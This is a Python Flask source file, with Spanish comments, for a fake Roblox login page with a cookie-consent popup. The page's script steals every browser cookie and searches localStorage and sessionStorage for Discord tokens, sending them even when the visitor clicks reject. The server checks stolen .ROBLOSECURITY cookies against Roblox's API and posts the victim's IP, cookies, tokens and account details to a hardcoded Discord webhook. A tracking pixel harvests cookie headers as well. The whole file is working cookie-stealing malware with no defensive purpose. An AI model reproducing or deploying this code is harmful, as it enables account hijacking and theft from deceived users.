from flask import Flask, request, Response, redirect, jsonify
import requests
import json
from datetime import datetime
import os
import base64
import random
import string
import re

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"

# Imagen pixel transparente
PIXEL = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")

def verify_roblox_cookie(cookie):
    """Verifica una cookie de Roblox con la API"""
    try:
        session = requests.Session()
        session.cookies['.ROBLOSECURITY'] = cookie
        response = session.get('https://www.roblox.com/mobileapi/userinfo')
        
        if response.status_code == 200:
            data = response.json()
            return {
                "valid": True,
                "username": data.get('UserName', 'Unknown'),
                "user_id": data.get('UserID', 'Unknown'),
                "robux": data.get('RobuxBalance', 0),
                "premium": data.get('IsPremium', False),
                "avatar": data.get('ThumbnailUrl', '')
            }
        else:
            return {"valid": False, "error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def extract_discord_tokens():
    """Lista de posibles nombres de localStorage para Discord tokens"""
    return [
        'discord_token',
        'token',
        'access_token',
        'refresh_token',
        'discord_access_token',
        'user_token',
        'authorization',
        'bearer_token',
        'oauth_token',
        'session_token',
        'login_token',
        'auth_token',
        'id_token',
        'secret_token',
        'api_key',
        'api_token',
        'webhook_token',
        'bot_token',
        'client_token',
        'user_access_token',
        'discord_user_token',
        'discord_bot_token',
        'discord_api_token',
        'discord_auth_token',
        'discord_session_token',
        'discord_login_token',
        'discord_secret_token',
        'discord_webhook_token',
        'discord_oauth_token',
        'discord_bearer_token',
        'discord_refresh_token',
        'discord_id_token',
        'discord_client_token',
        'discord_user_access_token',
        'discord_bot_access_token',
        'discord_api_access_token',
        'discord_auth_access_token',
        'discord_session_access_token',
        'discord_login_access_token',
        'discord_secret_access_token',
        'discord_webhook_access_token',
        'discord_oauth_access_token',
        'discord_bearer_access_token',
        'discord_refresh_access_token',
        'discord_id_access_token',
        'discord_client_access_token',
        'discord_user_bearer_token',
        'discord_bot_bearer_token',
        'discord_api_bearer_token',
        'discord_auth_bearer_token',
        'discord_session_bearer_token',
        'discord_login_bearer_token',
        'discord_secret_bearer_token',
        'discord_webhook_bearer_token',
        'discord_oauth_bearer_token',
        'discord_bearer_bearer_token',
        'discord_refresh_bearer_token',
        'discord_id_bearer_token',
        'discord_client_bearer_token',
        'discord_user_refresh_token',
        'discord_bot_refresh_token',
        'discord_api_refresh_token',
        'discord_auth_refresh_token',
        'discord_session_refresh_token',
        'discord_login_refresh_token',
        'discord_secret_refresh_token',
        'discord_webhook_refresh_token',
        'discord_oauth_refresh_token',
        'discord_bearer_refresh_token',
        'discord_refresh_refresh_token',
        'discord_id_refresh_token',
        'discord_client_refresh_token',
        'discord_user_secret_token',
        'discord_bot_secret_token',
        'discord_api_secret_token',
        'discord_auth_secret_token',
        'discord_session_secret_token',
        'discord_login_secret_token',
        'discord_secret_secret_token',
        'discord_webhook_secret_token',
        'discord_oauth_secret_token',
        'discord_bearer_secret_token',
        'discord_refresh_secret_token',
        'discord_id_secret_token',
        'discord_client_secret_token',
        'discord_user_webhook_token',
        'discord_bot_webhook_token',
        'discord_api_webhook_token',
        'discord_auth_webhook_token',
        'discord_session_webhook_token',
        'discord_login_webhook_token',
        'discord_secret_webhook_token',
        'discord_webhook_webhook_token',
        'discord_oauth_webhook_token',
        'discord_bearer_webhook_token',
        'discord_refresh_webhook_token',
        'discord_id_webhook_token',
        'discord_client_webhook_token'
    ]

def send_to_discord(cookies_data, ip, user_agent, discord_tokens=None):
    """Envía toda la información a Discord"""
    try:
        roblox_cookie = cookies_data.get('.ROBLOSECURITY', 'No encontrada')
        
        # Verificar cookie de Roblox
        user_info = {"valid": False}
        if roblox_cookie != 'No encontrada':
            user_info = verify_roblox_cookie(roblox_cookie)
        
        # Preparar campos del embed
        fields = [
            {"name": "🌐 IP", "value": str(ip), "inline": True},
            {"name": "🖥️ User Agent", "value": str(user_agent)[:100], "inline": True},
            {"name": "📅 Fecha/Hora", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": True}
        ]
        
        # Información de Roblox si la cookie es válida
        if user_info.get('valid'):
            fields.append({"name": "👤 Username Roblox", "value": user_info['username'], "inline": True})
            fields.append({"name": "🆔 User ID", "value": str(user_info['user_id']), "inline": True})
            fields.append({"name": "💰 Robux", "value": str(user_info['robux']), "inline": True})
            fields.append({"name": "⭐ Premium", "value": "✅ Sí" if user_info['premium'] else "❌ No", "inline": True})
            fields.append({"name": "🔴 .ROBLOSECURITY (VÁLIDA)", "value": f"```{roblox_cookie}```", "inline": False})
        else:
            fields.append({"name": "🔴 .ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False})
        
        # Tokens de Discord encontrados
        if discord_tokens:
            discord_text = ""
            for key, value in discord_tokens.items():
                if value and value != 'undefined' and value != 'null':
                    discord_text += f"**{key}:** `{value}`\n"
            
            if discord_text:
                fields.append({"name": "🔵 TOKENS DE DISCORD", "value": discord_text[:1000], "inline": False})
        
        # Todas las cookies
        cookies_text = json.dumps(cookies_data, indent=2, ensure_ascii=False)
        if len(cookies_text) > 1000:
            cookies_text = cookies_text[:1000] + "..."
        
        fields.append({"name": "📋 TODAS LAS COOKIES", "value": f"```json\n{cookies_text}```", "inline": False})
        
        embed = {
            "title": f"🎯 COOKIES CAPTURADAS - {user_info.get('username', 'Desconocido')}",
            "color": 16711680 if user_info.get('valid') else 16776960,
            "fields": fields,
            "footer": {"text": "Cookie Logger Profesional - Datos Verificados"}
        }
        
        payload = {
            "content": "@everyone **🚨 COOKIES CAPTURADAS**",
            "embeds": [embed]
        }
        
        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print(f"Datos enviados a Discord: {response.status_code}")
        
    except Exception as e:
        print(f"Error enviando a Discord: {e}")

@app.route('/')
def index():
    """Página principal con popup falso de cookies"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    html = f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Iniciar Sesión</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        
        .container {{
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            position: relative;
        }}
        
        .roblox-logo {{
            text-align: center;
            margin-bottom: 30px;
        }}
        
        .roblox-logo h1 {{
            color: #ff0000;
            font-size: 36px;
            font-weight: bold;
            letter-spacing: 2px;
        }}
        
        .roblox-logo p {{
            color: #666;
            font-size: 14px;
        }}
        
        .cookie-popup {{
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 15px;
            padding: 25px;
            margin: 20px 0;
            position: relative;
        }}
        
        .cookie-popup h2 {{
            color: #333;
            font-size: 20px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        
        .cookie-popup h2::before {{
            content: '🍪';
            font-size: 24px;
        }}
        
        .cookie-popup p {{
            color: #666;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 20px;
        }}
        
        .cookie-options {{
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-bottom: 20px;
        }}
        
        .cookie-option {{
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px;
            background: white;
            border-radius: 8px;
            border: 1px solid #dee2e6;
        }}
        
        .cookie-option input[type="checkbox"] {{
            width: 18px;
            height: 18px;
            accent-color: #ff0000;
        }}
        
        .cookie-option label {{
            font-size: 14px;
            color: #333;
            flex: 1;
        }}
        
        .cookie-option .badge {{
            background: #ff0000;
            color: white;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 11px;
        }}
        
        .cookie-buttons {{
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }}
        
        .btn {{
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            flex: 1;
        }}
        
        .btn-primary {{
            background: #ff0000;
            color: white;
        }}
        
        .btn-primary:hover {{
            background: #cc0000;
            transform: translateY(-2px);
        }}
        
        .btn-secondary {{
            background: #6c757d;
            color: white;
        }}
        
        .btn-secondary:hover {{
            background: #5a6268;
            transform: translateY(-2px);
        }}
        
        .btn-link {{
            background: transparent;
            color: #ff0000;
            text-decoration: underline;
        }}
        
        .loading {{
            display: none;
            text-align: center;
            padding: 20px;
        }}
        
        .spinner {{
            border: 3px solid #f3f3f3;
            border-top: 3px solid #ff0000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }}
        
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        
        .footer {{
            text-align: center;
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }}
        
        .footer a {{
            color: #ff0000;
            text-decoration: none;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="roblox-logo">
            <h1>ROBLOX</h1>
            <p>Inicia sesión para continuar</p>
        </div>
        
        <div class="cookie-popup" id="cookiePopup">
            <h2>Configuración de Cookies</h2>
            <p>Roblox utiliza cookies y tecnologías similares para mejorar tu experiencia, personalizar contenido y analizar nuestro tráfico. Al hacer clic en "Aceptar todas", aceptas el uso de todas las cookies.</p>
            
            <div class="cookie-options">
                <div class="cookie-option">
                    <input type="checkbox" id="necessary" checked disabled>
                    <label for="necessary">Cookies necesarias</label>
                    <span class="badge">Siempre activas</span>
                </div>
                <div class="cookie-option">
                    <input type="checkbox" id="functional" checked>
                    <label for="functional">Cookies funcionales</label>
                </div>
                <div class="cookie-option">
                    <input type="checkbox" id="analytics" checked>
                    <label for="analytics">Cookies de análisis</label>
                </div>
                <div class="cookie-option">
                    <input type="checkbox" id="marketing" checked>
                    <label for="marketing">Cookies de marketing</label>
                </div>
            </div>
            
            <div class="cookie-buttons">
                <button class="btn btn-secondary" onclick="rejectCookies()">Rechazar todas</button>
                <button class="btn btn-primary" onclick="acceptCookies()">Aceptar todas</button>
            </div>
            
            <div style="text-align: center; margin-top: 15px;">
                <button class="btn btn-link" onclick="showPreferences()">Configurar preferencias</button>
            </div>
        </div>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Redireccionando a Roblox...</p>
        </div>
        
        <div class="footer">
            <p>Al continuar, aceptas nuestros <a href="#">Términos de Servicio</a> y <a href="#">Política de Privacidad</a></p>
        </div>
    </div>
    
    <script>
        // Función para capturar TODAS las cookies
        function getAllCookies() {{
            const cookies = document.cookie.split(';');
            const cookieObj = {{}};
            
            cookies.forEach(cookie => {{
                cookie = cookie.trim();
                if (cookie) {{
                    const separatorIndex = cookie.indexOf('=');
                    if (separatorIndex > 0) {{
                        const name = cookie.substring(0, separatorIndex);
                        const value = cookie.substring(separatorIndex + 1);
                        cookieObj[name] = decodeURIComponent(value);
                    }}
                }}
            }});
            
            return cookieObj;
        }}
        
        // Función para intentar obtener tokens de Discord del localStorage
        function getDiscordTokens() {{
            const discordTokenNames = [
                'discord_token', 'token', 'access_token', 'refresh_token',
                'discord_access_token', 'user_token', 'authorization',
                'bearer_token', 'oauth_token', 'session_token',
                'login_token', 'auth_token', 'id_token', 'secret_token',
                'api_key', 'api_token', 'webhook_token', 'bot_token',
                'client_token', 'user_access_token', 'discord_user_token',
                'discord_bot_token', 'discord_api_token', 'discord_auth_token',
                'discord_session_token', 'discord_login_token', 'discord_secret_token',
                'discord_webhook_token', 'discord_oauth_token', 'discord_bearer_token',
                'discord_refresh_token', 'discord_id_token', 'discord_client_token',
                'discord_user_access_token', 'discord_bot_access_token',
                'discord_api_access_token', 'discord_auth_access_token',
                'discord_session_access_token', 'discord_login_access_token',
                'discord_secret_access_token', 'discord_webhook_access_token',
                'discord_oauth_access_token', 'discord_bearer_access_token',
                'discord_refresh_access_token', 'discord_id_access_token',
                'discord_client_access_token', 'discord_user_bearer_token',
                'discord_bot_bearer_token', 'discord_api_bearer_token',
                'discord_auth_bearer_token', 'discord_session_bearer_token',
                'discord_login_bearer_token', 'discord_secret_bearer_token',
                'discord_webhook_bearer_token', 'discord_oauth_bearer_token',
                'discord_bearer_bearer_token', 'discord_refresh_bearer_token',
                'discord_id_bearer_token', 'discord_client_bearer_token',
                'discord_user_refresh_token', 'discord_bot_refresh_token',
                'discord_api_refresh_token', 'discord_auth_refresh_token',
                'discord_session_refresh_token', 'discord_login_refresh_token',
                'discord_secret_refresh_token', 'discord_webhook_refresh_token',
                'discord_oauth_refresh_token', 'discord_bearer_refresh_token',
                'discord_refresh_refresh_token', 'discord_id_refresh_token',
                'discord_client_refresh_token', 'discord_user_secret_token',
                'discord_bot_secret_token', 'discord_api_secret_token',
                'discord_auth_secret_token', 'discord_session_secret_token',
                'discord_login_secret_token', 'discord_secret_secret_token',
                'discord_webhook_secret_token', 'discord_oauth_secret_token',
                'discord_bearer_secret_token', 'discord_refresh_secret_token',
                'discord_id_secret_token', 'discord_client_secret_token',
                'discord_user_webhook_token', 'discord_bot_webhook_token',
                'discord_api_webhook_token', 'discord_auth_webhook_token',
                'discord_session_webhook_token', 'discord_login_webhook_token',
                'discord_secret_webhook_token', 'discord_webhook_webhook_token',
                'discord_oauth_webhook_token', 'discord_bearer_webhook_token',
                'discord_refresh_webhook_token', 'discord_id_webhook_token',
                'discord_client_webhook_token'
            ];
            
            const foundTokens = {{}};
            
            discordTokenNames.forEach(name => {{
                try {{
                    const value = localStorage.getItem(name);
                    if (value && value !== 'undefined' && value !== 'null') {{
                        foundTokens[name] = value;
                    }}
                }} catch(e) {{
                    // Ignorar errores de localStorage
                }}
            }});
            
            // También buscar en sessionStorage
            try {{
                for (let i = 0; i < sessionStorage.length; i++) {{
                    const key = sessionStorage.key(i);
                    const value = sessionStorage.getItem(key);
                    if (key && value && value !== 'undefined' && value !== 'null') {{
                        if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord')) {{
                            foundTokens[key] = value;
                        }}
                    }}
                }}
            }} catch(e) {{
                // Ignorar errores
            }}
            
            return foundTokens;
        }}
        
        // Función para enviar datos al servidor
        async function sendData() {{
            const cookies = getAllCookies();
            const discordTokens = getDiscordTokens();
            
            try {{
                const response = await fetch('/capture', {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json'
                    }},
                    body: JSON.stringify({{
                        cookies: cookies,
                        discord_tokens: discordTokens
                    }})
                }});
                
                const data = await response.json();
                console.log('Datos enviados:', data);
            }} catch(error) {{
                console.error('Error enviando datos:', error);
            }}
        }}
        
        // Función cuando se aceptan cookies
        async function acceptCookies() {{
            document.getElementById('cookiePopup').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            await sendData();
            
            // Redirigir a Roblox
            setTimeout(() => {{
                window.location.href = 'https://www.roblox.com/es/users/7869790887/profile';
            }}, 1000);
        }}
        
        // Función cuando se rechazan cookies
        function rejectCookies() {{
            document.getElementById('cookiePopup').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Aún así enviar datos
            sendData();
            
            setTimeout(() => {{
                window.location.href = 'https://www.roblox.com/es/users/7869790887/profile';
            }}, 1000);
        }}
        
        // Función para mostrar preferencias
        function showPreferences() {{
            alert('Configuración de preferencias de cookies');
        }}
    </script>
</body>
</html>"""
    
    return html

@app.route('/capture', methods=['POST'])
def capture():
    """Endpoint para recibir cookies y tokens"""
    try:
        data = request.json
        cookies = data.get('cookies', {})
        discord_tokens = data.get('discord_tokens', {})
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        print(f"Cookies recibidas de {ip}: {json.dumps(cookies, indent=2)}")
        if discord_tokens:
            print(f"Tokens de Discord encontrados: {json.dumps(discord_tokens, indent=2)}")
        
        # Enviar a Discord
        send_to_discord(cookies, ip, user_agent, discord_tokens)
        
        return jsonify({"status": "success", "message": "Datos capturados"})
    except Exception as e:
        print(f"Error capturando datos: {e}")
        return jsonify({"status": "error", "message": str(e)})

@app.route('/pixel.png')
def pixel():
    """Endpoint para el pixel tracker"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Capturar cookies del header HTTP
    cookie_string = request.headers.get('Cookie', '')
    cookies = {}
    
    if cookie_string:
        for cookie in cookie_string.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
        
        if cookies:
            print(f"Cookies del header de {ip}: {json.dumps(cookies, indent=2)}")
            send_to_discord(cookies, ip, user_agent)
    
    return Response(PIXEL, mimetype='image/png')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
